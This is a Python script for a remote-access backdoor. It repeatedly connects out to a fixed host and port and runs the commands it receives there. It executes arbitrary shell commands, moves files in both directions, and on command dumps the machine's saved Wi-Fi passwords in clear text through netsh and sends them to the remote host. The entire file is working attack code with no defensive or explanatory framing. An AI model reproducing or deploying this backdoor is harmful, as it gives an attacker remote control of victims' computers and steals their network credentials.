import os
import socket
import time
import subprocess


def get_wifi_passwords():
    x = os.popen('netsh wlan show profile')

    wifiList = []

    y = x.readlines()

    for line in y:
        if "All User Profile" in line:
            line = line[27:]
            wifiList.append(line.strip())

    wifiCredentials = []

    for wifiName in wifiList:
        x = os.popen(f'netsh wlan show profile name = "{wifiName}" key = clear')
        infoLines = x.readlines()
        for line in infoLines:
            if "Key Content" in line:
                key = line[28:].strip()
                wifiCredentials.append([wifiName, key])

    x = ''
    for i in wifiCredentials:
        x += "Wifi Name: " + i[0] + "\n"
        x += i[1] + "\n\n"

    return x


def download_file(filename):
    data = b''
    print(f"[+] Downloading {filename}...")
    while True:
        try:
            s.settimeout(5)
            received_chunk = s.recv(4096)
            data += received_chunk
            bytes_received = len(data)
            print(f"Received {bytes_received} bytes.")
        except TimeoutError:
            file = open(filename, 'wb')
            file.write(data)
            file.close()
            print("[+] Download Ended, Connection Timed Out")
            break


def upload_file(filename):
    print(f"[+] Uploading {filename}")
    file = open(filename, 'rb')
    data = file.read()
    file.close()
    s.sendall(data)


def get_command():
    print("[+] Listening for command...")
    command_got = s.recv(1024).decode("UTF-8")
    print(f"Command Received {command_got}")
    return command_got


def cater_command(command_got):
    result = None
    if command_got[:3] == "cd ":
        os.chdir(command_got[3:])
        result = f'[+] Changed directory to {command_got[3:]}'
    elif command == 'GET_WIFI_PASSES':
        credentials = get_wifi_passwords()
        s.sendall(bytes(credentials, "UTF-8"))
    elif command_got.strip() == "ls":
        execute = subprocess.Popen('ls', shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        result = execute.stdout.read() + execute.stderr.read()
        result = result.decode()
    elif command.strip() == 'dir':
        execute = subprocess.Popen('dir', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result = execute.stdout.read() + execute.stderr.read()
        result = result.decode()
    elif command_got[:9] == 'download ':
        upload_file(command_got[9:])
    elif command[:7] == "upload ":
        download_file(command[7:])
    elif command_got[:7] == "CUSTOM ":
        execute = subprocess.Popen(command_got[7:], shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result = execute.stdout.read() + execute.stderr.read()
        result = result.decode()

    return result


def reliable_send(data):
    if data:
        s.sendall(bytes(data, "UTF-8"))


s = socket.socket()
ip = '192.168.1.1'
port = 5000

connected = False


while True:

    while not connected:
        s = socket.socket()
        for i in range(10):
            print("[+] Connecting..")
            try:
                s.connect((ip, port))
                connected = True
                break
            except socket.error as e:
                print(e)
                time.sleep(2)

    while connected:
        try:
            command = get_command()
            if command:
                print("Processing it...")
                if command.rstrip().lstrip() == 'exit':
                    connected = False
                    break
                response = cater_command(command)
                reliable_send(response)
            else:
                raise socket.error
        except socket.error as e:
            print("Connection Broken: ", e)
            connected = False
